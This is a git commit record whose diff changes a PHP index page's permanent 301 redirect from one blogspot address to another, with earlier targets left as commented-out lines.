596cd87ae809a160486eff4b44eae4b253a98d23
argeni5959 <67845811+argeni5959@users.noreply.github.com>
2020-07-19 19:26:58 -0400

    Update index.php

--- ditroind/dengue-master/index.php
+++ ditroind/dengue-master/index.php
@@ -5,7 +5,7 @@ Header( "HTTP/1.1 301 Moved Permanently" );
 //Header( "Location: http://gloverialismanterasas.blogspot.com/");
 
 
-Header( "Location: http://gloverialismanterasas.blogspot.com/");
+Header( "Location: http://partilistamerialianesasas.blogspot.com/");
 //Header( "Location: https://www.google.com");
 
 ?>
